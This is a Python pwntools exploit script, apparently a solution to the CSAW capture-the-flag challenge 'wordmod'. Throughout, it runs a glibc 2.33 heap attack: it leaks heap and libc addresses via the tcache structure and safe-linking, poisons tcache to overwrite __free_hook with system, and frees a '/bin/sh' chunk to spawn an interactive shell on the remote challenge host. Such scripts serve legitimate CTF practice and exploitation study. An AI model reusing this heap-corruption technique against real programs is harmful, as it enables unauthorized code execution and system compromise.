#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'pwn.chal.csaw.io', 5001
binary = './wordmod'
brkpts = '''
'''

elf = ELF("wordmod")
libc = ELF("libc-2.33.so")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8,"\x00"))

if len(sys.argv) > 1:
    if sys.argv[1] == '-r':
        io = remote(remote_ip, port)
        context.noptrace = True
    else:
        io = gdb.debug(binary, env = {'LD_PRELOAD' : './libc-2.33.so'})

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc-2.33.so'})
    
def choice(idx):
    sla("> ", str(idx))

def add(size, data):
    choice(1)
    choice(size)
    sa("> ", data)

def free():
    choice(2)

def hear():
    choice(3)

def encrypt(base, ptr):
    return ptr ^ (base >> 12)

if __name__ == "__main__":
    add(0x10, "fun")
    add(0x30, "fun".ljust(0x10, "b"))
    add(0x30, "fun".ljust(0x30, "a"))

    add(0x500, "fun".ljust(0x500, "a"))

    hear()

    # Leak from tcache struct (cookie)
    reu("so far is: ")
    heap = uu64(rl().strip()) << 12
    log.info("heap @ "+hex(heap))

    # Allocation on tcache struct
    payload = p32(0) + p16(2) + p16(1)
    payload = payload.ljust(0x88, "\x00")
    payload += p64(0)

    # Overwrite 0x40 entry to itself, 0x50 for libc leak
    payload += p64(heap + 0xa0)
    payload += p64(heap + 0x2a0)
    add(0x280, payload)

    # Setup libc leak
    add(0x48, "a"*8 + p64(heap + 0xab0))

    hear()
    reu("so far is: ")
    libc.address = uu64(rl().strip()) - 0x1c0a60
    log.info("libc @ "+hex(libc.address))

    system = libc.symbols['system']
    free_hook = libc.symbols['__free_hook']

    gdb.attach(io)

    add(0x38, p64(free_hook-0x10))

    add(0x38, "/bin/sh\x00" + p64(0) + p64(system))

    free()
    io.interactive()
